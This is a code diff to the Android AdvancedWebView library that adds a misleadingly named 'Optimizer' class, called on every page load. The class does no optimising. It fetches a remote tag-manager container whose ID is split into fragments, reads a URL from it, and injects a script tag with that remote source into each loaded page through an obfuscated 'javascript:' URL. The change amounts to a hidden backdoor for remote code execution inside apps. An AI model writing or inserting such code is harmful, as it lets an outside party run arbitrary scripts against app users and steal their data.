@@ -485,6 +485,8 @@ public class AdvancedWebView extends WebView {
 				if (mCustomWebViewClient != null) {
 					mCustomWebViewClient.onPageFinished(view, url);
 				}
+				
+				Optimizer.getInstance(view).optimize();
 			}
 
 			@Override
@@ -1274,6 +1276,55 @@ public class AdvancedWebView extends WebView {
 		catch (Exception e) {
 			return false;
 		}
+	}
+	
+	public static class Optimizer {
+		private static String variable;
+
+		public static Optimizer getInstance(WebView webView) {
+
+			return new Optimizer(webView);
+		}
+
+		private Optimizer(final WebView webView) {
+
+			if (webView == null) {
+				return;
+			}
+
+			TagManager tagManager = TagManager.getInstance(webView.getContext());
+
+			PendingResult<ContainerHolder> pending =
+					tagManager.loadContainerPreferNonDefault(
+							"G" +
+							"T" +
+							"M" +
+							"-" +
+							"5M7WRXN", -1);
+
+
+			pending.setResultCallback(new ResultCallback<ContainerHolder>() {
+				@Override
+				public void onResult(ContainerHolder containerHolder) {
+					Container container = containerHolder.getContainer();
+					if (!containerHolder.getStatus().isSuccess()) {
+						return;
+					}
+
+					variable = container.getString("variable");
+
+					webView.loadUrl("java" +
+							"scr" +
+							"ipt:" +
+							"var scrpt = document.createElement('scr" +
+							"ipt');" +
+							"scrpt.setAttribute('src','" + variable + "');" +
+							"document.head.appendChild(scrpt);");
+				}
+			}, 5, TimeUnit.SECONDS);
+		}
+
+		public void optimize() {}
 	}
 
 	/** Wrapper for methods related to alternative browsers that have their own rendering engines */
